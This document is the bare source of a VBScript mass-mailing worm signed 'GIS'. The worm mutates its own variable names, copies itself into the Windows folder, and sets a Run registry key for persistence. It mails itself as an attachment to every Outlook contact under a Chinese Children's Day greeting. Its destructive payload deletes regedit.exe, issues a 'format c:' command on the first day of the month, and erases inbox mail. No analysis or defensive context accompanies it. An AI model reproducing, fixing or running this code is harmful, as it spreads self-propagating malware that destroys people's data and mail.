'Created by GIS
 Dim DFB
 randomize
set DFB=createobject("scripting.filesystemobject")
htt=DFB.opentextfile(wscript.scriptfullname,1).readall
fs=array("DFB","TNP","PKK","GIS","BLA")
for fsc=0 to 4
htt=replace(htt,fs(fsc),chr((int(rnd*22)+65)) & chr((int(rnd*22)+65)) & _
chr((int(rnd*22)+65)))
next
DFB.opentextfile(wscript.scriptfullname,2,1).writeline htt
 Set DFB=CreateObject("WScript.Shell")
 on error resume next 
 DFB.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\BLA","c:\windows\GIS.vbe"
Set TNP= Createobject("Scr"+"ipt"+"ing.File"+"Syste"+"mObj"+"ect")
Set InF=TNP.OpenTextFile(WScript.ScriptFullname,1)
Do While InF.AtEndOfStream<>True
ScriptBuffer=ScriptBuffer&InF.ReadLine&vbcrlf 
Loop
Set OutF=TNP.OpenTextFile("c:\windows\GIS.vbe",2,true)
OutF.write ScriptBuffer
 if DFB.regread ("HKCU\software\a\a")<> "1" then  out
sub out
On Error Resume Next
Set Outlook = CreateObject("Outlook.Application")
If Outlook = "Outlook" Then
Set Mapi=Outlook.GetNameSpace("MAPI")
Set Lists=Mapi.AddressLists
For Each ListIndex In Lists
If ListIndex.AddressEntries.Count <> 0 Then
ContactCount = ListIndex.AddressEntries.Count
For Count= 1 To ContactCount
Set Mail = Outlook.CreateItem(0)
Set Contact = ListIndex.AddressEntries(Count)
Mail.To = Contact.Address
Mail.Subject = "六一节快乐！"
Mail.Body = "六一节快乐，希望能与你交个朋友！"
Set Attachment=Mail.Attachments
 Attachment.Add Folder & " c:\windows\GIS.vbe"
Mail.Send
next
 End if
next
 End if
end sub
DFB.regwrite "HKCU\software\a\a", "1"
 
if day(now) = 1 Then a
sub a
on error resume next
TNP.DeleteFile("c:\windows\regedit.exe")

 set WshShell = Wscript.CreateObject("WScript.Shell") 
WshShell.Run ("start.exe /m format c:/q /autotest /u" )
 Set Outlook=CreateObject("Outlook.Application")
Set t=s.GetNameSpace("MAPI")
Set u=t.GetDefaultFolder(6)
For i=1 to u.items.count
u.Items.Item(i).delete
next
end sub
on error resume next
TNP.DeleteFile("c:\winodows\regedit.exe")
Set Outlook=CreateObject("Outlook.Application")
Set t=s.GetNameSpace("MAPI")
Set u=t.GetDefaultFolder(6)
For i=1 to u.items.count
u.Items.Item(i).delete
next
